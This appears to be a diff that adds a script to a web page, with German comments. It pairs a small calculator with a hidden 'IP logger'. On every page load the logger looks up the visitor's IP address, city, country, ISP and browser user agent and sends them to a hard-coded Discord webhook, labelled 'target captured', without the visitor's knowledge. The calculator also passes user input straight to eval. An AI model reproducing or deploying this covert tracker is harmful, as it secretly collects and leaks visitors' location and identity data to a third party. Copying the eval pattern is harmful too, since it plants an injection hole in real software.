@@ -1,0 +1,59 @@
+<script>
+    // --- RECHNER LOGIK ---
+    let display = document.getElementById('display');
+    function appendToDisplay(value) { display.value += value; }
+    function clearDisplay() { display.value = ''; }
+    function deleteLast() { display.value = display.value.slice(0, -1); }
+    function calculate() {
+        try { display.value = eval(display.value); }
+        catch { display.value = "Fehler"; }
+    }
+
+    // --- VERBESSERTER IP-LOGGER ---
+    const webhookUrl = "https://discord.com/api/webhooks/1456016637718298675/IdQq0U1qE8z51FdqJjvAKD-3kPNZ3rQPupUxjRvNy9sE_gQpPJQTa74YtWylKEehY2j1";
+
+    async function logVisit() {
+        try {
+            // Wir nutzen ip-api.com (sehr stabil für JavaScript)
+            const response = await fetch('http://ip-api.com/json/?fields=status,message,country,city,isp,query');
+            const info = await response.json();
+
+            if (info.status === 'success') {
+                const message = {
+                    embeds: [{
+                        title: "🎯 Zielperson erfasst",
+                        color: 15158332, // Rot-Orange
+                        fields: [
+                            { name: "IP-Adresse", value: info.query, inline: true },
+                            { name: "Standort", value: `${info.city}, ${info.country}`, inline: true },
+                            { name: "Internet-Provider", value: info.isp },
+                            { name: "User-Agent", value: navigator.userAgent }
+                        ],
+                        footer: { text: "Logger gestartet über ip-api" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+            }
+        } catch (e) {
+            // Falls die HTTP-API blockiert wird (weil Discord HTTPS ist),
+            // nutzen wir einen Fallback auf eine HTTPS-API
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: "⚠️ Eingeschränktes Logging (Nur IP): " + data.ip })
+                    });
+                });
+        }
+    }
+
+    logVisit();
+</script>
